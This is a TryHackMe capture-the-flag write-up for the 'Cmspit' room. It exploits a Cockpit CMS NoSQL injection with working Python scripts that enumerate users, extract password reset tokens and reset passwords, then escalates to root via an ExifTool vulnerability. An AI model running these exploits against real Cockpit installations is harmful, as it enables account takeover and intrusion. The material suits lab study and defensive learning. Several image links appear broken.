---
title: "Cmspit"
platform: "TryHackMe"
difficulty: "Medium"
date: 2024-02-20
tags: ["token", "auth"]
---

![infocard](https://tryhackme-images.s3.amazonaws.com/room-icons/af878fdc94fd054dd34b05b7977a6c09.png)



## Reconnaissance
### **Nmap Scan**

The first step in our attack is scanning the target system using Nmap, a powerful network scanning tool that helps identify open ports and running services.

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 11:09 EST
Nmap scan report for 10.10.29.223
Host is up (0.32s latency).

PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
80/tcp open  ssl/http Apache/2.4.18 (Ubuntu)
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.16 seconds
```

From this scan, we can see two services running:

- **SSH (Port 22)**: OpenSSH 7.2p2
- **HTTP (Port 80)**: Apache/2.4.18 with a login page

Since web applications are often more vulnerable than SSH, we focus our attack on the HTTP service.

### **Exploring the HTTP Service**

#### **Identifying the CMS**

Upon navigating to the IP address in a browser, we encounter a login page. Upon further inspection, we identify the Content Management System (CMS) in use: **Cockpit CMS**.

![login](https://chatgpt.com/c/media/login.png)

Checking the page source reveals the CMS version: **0.11.1**.

![version](https://chatgpt.com/c/media/version.png)

#### **Searching for Exploits**

Using `searchsploit`, a tool for quickly searching available exploits in the Exploit-DB repository, we find a relevant exploit for Cockpit CMS 0.11.1.

![searchsploit](https://chatgpt.com/c/media/searchsploit.png)

This exploit allows us to enumerate usernames and reset passwords using a **NoSQL Injection vulnerability**.

### **Exploiting Cockpit CMS**

Before executing the exploit, let's understand its working.

The vulnerability is in the `/auth/check` endpoint, where the `user` parameter is not validated properly. This flaw allows us to pass arbitrary objects that get parsed by MongoDB, effectively manipulating the query execution.

![code](https://swarm.ptsecurity.com/wp-content/uploads/2021/04/cockpit_auth_authenticate_src.png)

#### Username Enumeration**

We send a crafted request to `/auth/requestreset` using the `var_dump` function to list usernames.

```python
import requests, json, re

def enumerate_users(url):
    print("[-] Attempting Username Enumeration (CVE-2020-35846) : \n")
    url = url + "/auth/requestreset"
    headers = {"Content-Type": "application/json"}
    data = {"user": {"$func": "var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern = re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print("[+] Users Found : " + str(matches))
        return matches
    else:
        print("No users found")
```

Executing the script returns the usernames:

- `admin`
- `sdarkStar7471`
- `skidy`
- `ekoparty`

![user_dump](https://chatgpt.com/c/media/user_dump.png)

#### Extracting Password Reset Tokens**

The `/auth/resetpassword` endpoint allows password reset if a valid token is provided. However, since the `token` parameter is also unfiltered, we can extract all valid reset tokens.

```python
import requests, json, re

def reset_tokens(url):
    print("[+] Finding Password Reset Tokens")
    url = url + "/auth/resetpassword"
    headers = {"Content-Type": "application/json"}
    data = {"token": {"$func": "var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern = re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print("[+] Tokens Found: " + str(matches))
        return matches
    else:
        print("No tokens found")
```

#### Resetting Password**

Using the extracted token, we can reset a user's password:

```python
import requests, json, random, string

def password_reset(url, token, user):
    print("[-] Attempting to reset %s's password:" % user)
    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))
    url = url + "/auth/resetpassword"
    headers = {"Content-Type": "application/json"}
    data = {"token": token, "password": password}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    if "success" in req.content.decode('utf-8'):
        print("[+] Password Updated Successfully!")
        print("[+] The New Credentials: \n \t Username : %s \n \t Password : %s" % (user, password))
```

With the new credentials, we log in and upload a PHP shell to gain access as `www-data`.

![wwwdata](https://chatgpt.com/c/media/wwwdata.png)

## **Privilege Escalation**

#### **Gaining Higher Privileges**

We find a user named `stux`, and inside their home directory, a `.dbshell` file containing their password.

Using this password, we switch to `stux`:

```bash
stux@ubuntu:~$ whoami
stux
```

#### **Root Privileges via ExifTool Exploit**

`stux` can execute `exiftool` as root, which is vulnerable to `CVE-2021-22204`. Exploiting this vulnerability gives us a root shell.

![dejavu](https://chatgpt.com/c/media/dejavu.png)

```bash
root@ubuntu:~# whoami
root
```

## **Resources**

- [From 0 to RCE: Cockpit CMS](https://swarm.ptsecurity.com/rce-cockpit-cms/)
- [CVE-2021-22204: ExifTool RCE](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)